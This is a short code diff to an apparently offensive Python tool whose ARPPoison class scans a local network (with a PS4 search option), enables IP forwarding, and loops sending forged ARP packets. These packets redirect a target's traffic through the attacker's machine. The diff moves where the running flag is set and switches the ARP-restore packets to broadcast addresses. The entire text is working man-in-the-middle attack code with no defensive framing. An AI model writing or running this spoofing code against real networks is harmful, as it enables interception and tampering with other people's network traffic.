@@ -18,7 +18,6 @@ class ARPPoison(threading.Thread):
 		self.machines = {}
 
 	def run(self):
-		self.running = True
 		atexit.register(self.__del__)
 		if self.stdout: print("Finding network devices...")
 		self.machines = get_machines.search(ps4=True)
@@ -28,6 +27,7 @@ class ARPPoison(threading.Thread):
 			f.write("1")
 
 		if self.stdout: print("ARP Poisoning...")
+		self.running = True
 		while self.running:
 			#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
 			net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
@@ -40,8 +40,8 @@ class ARPPoison(threading.Thread):
 			return
 		self.running = False
 		if self.stdout: print("Restoring ARP...")
-		net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
-		net.send(net.ARP(op="who-has", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, hwsrc=self.machines["target"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)
+		net.send(net.ARP(op="who-has", hwdst="ff:ff:ff:ff:ff:ff", pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+		net.send(net.ARP(op="who-has", hwdst="ff:ff:ff:ff:ff:ff", pdst=self.machines["gateway"].ip, hwsrc=self.machines["target"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)
 
 		if self.stdout: print("Disabling IP Forward...")
 		with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
